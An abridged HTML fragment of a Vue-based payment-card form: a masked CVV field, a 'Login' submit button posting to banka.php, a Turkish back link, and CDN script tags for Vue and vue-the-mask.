...
<div class="wrapper" id="app">
    <div class="card-form">
      ...
      <form action="banka.php" method="POST">
...
<input type="text" class="card-input__input" id="cardCvv" name="cardCvv" v-mask="'####'" maxlength="4" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off">
        ...
        <input type="submit" value="Login" class="card-form__button"/>
    ...
    <a href="index.php" class="github-btn">
     <~~ Geri Dön
    </a>
  </div>
  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script><script  src="js/script.js"></script>
